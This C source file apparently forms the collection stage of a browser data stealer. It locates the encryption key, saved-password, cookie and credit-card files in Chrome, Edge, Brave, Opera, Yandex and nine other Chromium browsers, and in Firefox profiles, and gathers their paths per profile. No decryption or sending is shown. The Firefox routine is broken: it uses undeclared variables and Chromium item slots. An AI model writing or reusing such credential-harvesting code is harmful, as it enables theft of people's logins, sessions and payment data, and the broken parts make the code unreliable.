#include "pch.h"

LPWSTR GetItemFileName
(
	_In_ ProfileItem ItemType
)
{
	if (ItemType == ChromiumKey) {
		return DuplicateStrW(L"Local State", 0);
	}
	else if (ItemType == ChromiumPassword) {
		return DuplicateStrW(L"Login Data", 0);
	}
	else if (ItemType == ChromiumCookie) {
		return DuplicateStrW(L"Cookies", 0);
	}
	else if (ItemType == ChromiumBookmark) {
		return DuplicateStrW(L"Bookmarks", 0);
	}
	else if (ItemType == ChromiumHistory) {
		return DuplicateStrW(L"History", 0);
	}
	else if (ItemType == ChromiumDownload) {
		return DuplicateStrW(L"History", 0);
	}
	else if (ItemType == ChromiumCreditCard) {
		return DuplicateStrW(L"Web Data", 0);
	}
	else if (ItemType == ChromiumLocalStorage) {
		return DuplicateStrW(L"Local Storage\\leveldb", 0);
	}
	else if (ItemType == ChromiumSessionStorage) {
		return DuplicateStrW(L"Session Storage", 0);
	}
	else if (ItemType == ChromiumExtension) {
		return DuplicateStrW(L"Extensions", 0);
	}
	else if (ItemType == YandexPassword) {
		return DuplicateStrW(L"Ya Passman Data", 0);
	}
	else if (ItemType == YandexCreditCard) {
		return DuplicateStrW(L"Ya Credit Cards", 0);
	}
	else if (ItemType == FirefoxKey4) {
		return DuplicateStrW(L"key4.db", 0);
	}
	else if (ItemType == FirefoxPassword) {
		return DuplicateStrW(L"logins.json", 0);
	}
	else if (ItemType == FirefoxCookie) {
		return DuplicateStrW(L"cookies.sqlite", 0);
	}
	else if (ItemType == FirefoxBookmark) {
		return DuplicateStrW(L"places.sqlite", 0);
	}
	else if (ItemType == FirefoxHistory) {
		return DuplicateStrW(L"places.sqlite", 0);
	}
	else if (ItemType == FirefoxDownload) {
		return DuplicateStrW(L"places.sqlite", 0);
	}
	else if (ItemType == FirefoxLocalStorage) {
		return DuplicateStrW(L"webappsstore.sqlite", 0);
	}
	else if (ItemType == FirefoxSessionStorage) {
		return DuplicateStrW(L"extensions.json", 0);
	}

	return NULL;
}

BOOL ChromiumWalk
(
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpArgs
)
{
	PUSER_DATA pUserData = NULL;
	PPROFILE_INFO pProfile = NULL;
	DWORD i = 0;
	DWORD j = 0;
	DWORD k = 0;
	LPWSTR lpFileName = NULL;
	ProfileItem DefaultChromiumItems[] = { ChromiumKey, ChromiumPassword, ChromiumCookie, ChromiumBookmark, ChromiumHistory, ChromiumDownload, ChromiumCreditCard, ChromiumLocalStorage, ChromiumSessionStorage, ChromiumExtension };
	LPWSTR lpTemp = NULL;
	LPWSTR lpTemp2 = NULL;
	LPWSTR lpProfilePath = NULL;
	LPWSTR lpProfileName = NULL;
	WCHAR chTemp = L'\0';
	BOOL IsFound = FALSE;
	LPWSTR lpChromiumKey = NULL;

	pUserData = (PUSER_DATA)lpArgs;
	lpFileName = PathFindFileNameW(lpPath);
	lpChromiumKey = GetItemFileName(ChromiumKey);;
	if (!StrCmpW(lpFileName, lpChromiumKey)) {
		pUserData->lpKeyPath = DuplicateStrW(lpPath, 0);
		goto CLEANUP;
	}

	for (i = 1; i < _countof(DefaultChromiumItems); i++) {
		lpTemp = GetItemFileName(DefaultChromiumItems[i]);
		if (!StrCmpW(lpTemp, lpFileName)) {
			if (StrStrW(lpPath, L"System Profile")) {
				continue;
			}

			lpTemp2 = StrStrW(lpPath, L"\\Network\\Cookies");
			if (lpTemp2) {
				chTemp = lpTemp2[0];
				lpTemp2[0] = L'\0';
				lpProfilePath = DuplicateStrW(lpPath, 0);
				lpTemp2[0] = chTemp;
			}
			else {
				lpProfilePath = GetParentPathW(lpPath);
			}

			lpProfileName = PathFindFileNameW(lpProfilePath);
			IsFound = FALSE;
			for (j = 0; j < pUserData->cProfile; j++) {
				pProfile = pUserData->ProfileList[j];
				if (!StrCmpW(lpProfileName, pProfile->lpProfileName)) {
					pProfile->ItemPaths[DefaultChromiumItems[i]] = DuplicateStrW(lpPath, 0);
					IsFound = TRUE;
				}
			}

			if (!IsFound) {
				pUserData->cProfile++;
				if (pUserData->ProfileList != NULL) {
					pUserData->ProfileList = REALLOC(pUserData->ProfileList, sizeof(PPROFILE_INFO) * pUserData->cProfile);
				}
				else {
					pUserData->ProfileList = ALLOC(sizeof(PPROFILE_INFO));
				}

				pProfile = ALLOC(sizeof(PROFILE_INFO));
				pProfile->ItemPaths[DefaultChromiumItems[i]] = DuplicateStrW(lpPath, 0);
				pProfile->lpProfileName = DuplicateStrW(lpProfileName, 0);
				pUserData->ProfileList[pUserData->cProfile - 1] = pProfile;
			}
			FREE(lpProfilePath);
		}

		FREE(lpTemp);
	}

CLEANUP:
	FREE(lpChromiumKey);

	return FALSE;
}

BOOL FireFoxWalk
(
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpArgs
)
{
	PUSER_DATA pUserData = NULL;
	PPROFILE_INFO pProfile = NULL;
	DWORD i = 0;
	DWORD j = 0;
	DWORD k = 0;
	LPWSTR lpFileName = NULL;
	ProfileItem DefaultFireFoxItems[] = { FirefoxKey4, FirefoxPassword, FirefoxCookie, FirefoxBookmark, FirefoxHistory, FirefoxDownload, FirefoxCreditCard, FirefoxLocalStorage, FirefoxSessionStorage, FirefoxExtension };
	LPWSTR lpTemp = NULL;
	LPWSTR lpProfilePath = NULL;
	LPWSTR lpProfileName = NULL;
	BOOL IsFound = FALSE;

	pUserData = (PUSER_DATA)lpArgs;
	lpFileName = PathFindFileNameW(lpPath);
	for (i = 1; i < _countof(DefaultFireFoxItems); i++) {
		lpTemp = GetItemFileName(DefaultFireFoxItems[i]);
		if (!StrCmpW(lpTemp, lpFileName)) {
			lpProfilePath = GetParentPathW(lpPath);
			lpProfileName = PathFindFileNameW(lpProfilePath);
			IsFound = FALSE;
			for (j = 0; j < pUserData->cProfile; j++) {
				pProfile = pUserData->ProfileList[j];
				if (!StrCmpW(lpProfileName, pProfile->lpProfileName)) {
					pProfile->ItemPaths[DefaultFireFoxItems[i]] = DuplicateStrW(lpPath, 0);
					IsFound = TRUE;
				}
			}

			if (!IsFound) {
				pUserData->cProfile++;
				if (pUserData->ProfileList != NULL) {
					pUserData->ProfileList = REALLOC(pUserData->ProfileList, sizeof(PPROFILE_INFO) * pUserData->cProfile);
				}
				else {
					pUserData->ProfileList = ALLOC(sizeof(PPROFILE_INFO));
				}

				pProfile = ALLOC(sizeof(PROFILE_INFO));
				pProfile->ItemPaths[DefaultFireFoxItems[i]] = DuplicateStrW(lpPath, 0);
				pProfile->lpProfileName = DuplicateStrW(lpProfileName, 0);
				pUserData->ProfileList[pUserData->cProfile - 1] = pProfile;
			}

			FREE(lpProfilePath);
		}

		FREE(lpTemp);
	}

CLEANUP:
	return FALSE;
}

PUSER_DATA* PickChromium
(
	_Out_ PDWORD pdwNumberOfUserDatas
)
{
	LPWSTR UserDataPaths[] = {
		L"\\AppData\\Local\\Google\\Chrome\\User Data\\",
		L"\\AppData\\Local\\Google\\Chrome Beta\\User Data\\",
		L"\\AppData\\Local\\Chromium\\User Data\\",
		L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\",
		L"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\",
		L"\\AppData\\Local\\360chrome\\Chrome\\User Data\\",
		L"\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\",
		L"\\AppData\\Roaming\\Opera Software\\Opera Stable\\",
		L"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\",
		L"\\AppData\\Local\\Vivaldi\\User Data\\",
		L"\\AppData\\Local\\CocCoc\\Browser\\User Data\\",
		L"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\",
		L"\\AppData\\Local\\DCBrowser\\User Data\\",
		L"\\AppData\\Local\\SogouExplorer\\Webkit\\User Data\\",
	};
	LPWSTR BrowserNames[] = {
		L"chrome",
		L"chrome-beta",
		L"chromium",
		L"edge",
		L"brave",
		L"360",
		L"qq",
		L"opera",
		L"opera-gx",
		L"vivaldi",
		L"coccoc",
		L"yandex",
		L"dc",
		L"sogou"
	};

	DWORD dwNumberOfUserDatas = 0;
	WCHAR wszUserProfile[MAX_PATH];
	LPWSTR lpFullPath = NULL;
	DWORD i = 0;
	DWORD j = 0;
	PUSER_DATA* pResult = NULL;
	PUSER_DATA pTemp = NULL;
	PPROFILE_INFO pProfile = NULL;
	LPWSTR lpStoragePath = NULL;
	LPWSTR lpStorageFileName = NULL;
	
	lpStorageFileName = GetItemFileName(ChromiumLocalStorage);
	pResult = ALLOC(sizeof(PUSER_DATA) * _countof(UserDataPaths));
	GetEnvironmentVariableW(L"USERPROFILE", wszUserProfile, _countof(wszUserProfile));
	for (i = 0; i < _countof(UserDataPaths); i++) {
		FREE(lpFullPath);
		lpFullPath = DuplicateStrW(wszUserProfile, 0x80);
		lstrcatW(lpFullPath, UserDataPaths[i]);
		if (IsFolderExist(lpFullPath)) {
			pTemp = ALLOC(sizeof(USER_DATA));
			pTemp->lpUserDataPath = DuplicateStrW(lpFullPath, 0);
			pTemp->lpBrowserName = DuplicateStrW(BrowserNames[i], 0);
			pResult[dwNumberOfUserDatas] = pTemp;
			ListFileEx(lpFullPath, LIST_RECURSIVELY, ChromiumWalk, pTemp);
			for (j = 0; j < pTemp->cProfile; j++) {
				pProfile = pTemp->ProfileList[j];
				if (pProfile->ItemPaths[ChromiumHistory] != NULL) {
					lpStoragePath = DuplicateStrW(pProfile->ItemPaths[ChromiumHistory], 0x40);
					lstrcatW(lpStoragePath, L"\\");
					lstrcatW(lpStoragePath, lpStorageFileName);
					if (IsFolderExist(lpStoragePath)) {
						FREE(pProfile->ItemPaths[ChromiumLocalStorage]);
						pProfile->ItemPaths[ChromiumLocalStorage] = lpStoragePath;
					}
					else {
						FREE(lpStoragePath);
					}
				}
			}

			dwNumberOfUserDatas++;
		}
	}

	if (pdwNumberOfUserDatas != NULL) {
		*pdwNumberOfUserDatas = dwNumberOfUserDatas;
	}

	/*for (i = 0; i < dwNumberOfUserDatas; i++) {
		
	}*/

CLEANUP:
	FREE(lpFullPath);
	FREE(lpStorageFileName);

	return pResult;
}

PUSER_DATA PickFireFox()
{
	WCHAR wszUserDataPath[] = L"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
	WCHAR wszUserProfile[MAX_PATH];
	LPWSTR lpFullPath = NULL;
	PUSER_DATA pResult = NULL;
	DWORD i = 0;

	GetEnvironmentVariableW(L"USERPROFILE", wszUserProfile, _countof(wszUserProfile));
	lpFullPath = DuplicateStrW(wszUserProfile, 0x80);
	lstrcatW(lpFullPath, wszUserDataPath);
	if (IsFolderExist(lpFullPath)) {
		pResult = ALLOC(sizeof(USER_DATA));
		pResult->lpUserDataPath = DuplicateStrW(lpFullPath, 0);
		pResult->lpBrowserName = DuplicateStrW(L"Firefox", 0);
		ListFileEx(lpFullPath, LIST_RECURSIVELY, FireFoxWalk, pResult);
		for (i = 0; i < pResult->cProfile; i++) {
			pProfile = pResult->ProfileList[i];
			if (pProfile->ItemPaths[ChromiumHistory] != NULL) {
				lpStoragePath = DuplicateStrW(pProfile->ItemPaths[ChromiumHistory], 0x40);
				lstrcatW(lpStoragePath, L"\\");
				lstrcatW(lpStoragePath, lpStorageFileName);
				if (IsFolderExist(lpStoragePath)) {
					FREE(pProfile->ItemPaths[ChromiumLocalStorage]);
					pProfile->ItemPaths[ChromiumLocalStorage] = lpStoragePath;
				}
				else {
					FREE(lpStoragePath);
				}
			}
		}

		dwNumberOfUserDatas++;
	}
CLEANUP:
	FREE(lpFullPath);

	return pResult;
}

VOID FreeUserData
(
	_In_ PUSER_DATA pUserData
)
{
	DWORD i = 0;
	DWORD j = 0;

	if (pUserData != NULL) {
		FREE(pUserData->lpUserDataPath);
		FREE(pUserData->lpBrowserName);
		FREE(pUserData->lpKeyPath);
		for (i = 0; i < pUserData->cProfile; i++) {
			FREE(pUserData->ProfileList[i]->lpProfileName);
			for (j = 0; j < ProfileItemEnd; j++) {
				FREE(pUserData->ProfileList[i]->ItemPaths[j]);
			}

			FREE(pUserData->ProfileList[i]);
		}

		FREE(pUserData->ProfileList);
		FREE(pUserData);
	}
}